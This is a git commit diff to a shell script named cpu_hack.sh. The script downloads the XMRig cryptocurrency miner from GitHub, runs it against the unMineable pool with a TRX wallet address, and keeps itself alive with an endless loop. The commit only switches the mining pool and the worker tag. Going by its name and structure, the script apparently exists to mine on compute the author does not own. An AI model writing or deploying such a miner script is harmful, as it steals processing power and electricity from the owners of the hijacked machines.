daac2214fb97139b14a030facbd439bcc02a030e
Bogdan0071231 <89198296+Bogdan0071231@users.noreply.github.com>
2021-08-19 17:27:39 +0500

    Update cpu_hack.sh

--- cpu_hack.sh
+++ cpu_hack.sh
@@ -4,7 +4,7 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar xf xmrig-6.14.0-linux-x64.tar.gz
 cd xmrig-6.14.0
-./xmrig -o kawpow.eu-north.nicehash.com:3385 -a rx -k -u TRX:THS3S7NrU6gnEaB36395tAWNTxEGvYzTd5 -p x --cpu 4
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:THS3S7NrU6gnEaB36395tAWNTxEGvYzTd5#go1b-g8i4 -p x --cpu 4
 while [ 1 ]; do
 sleep 3
 done
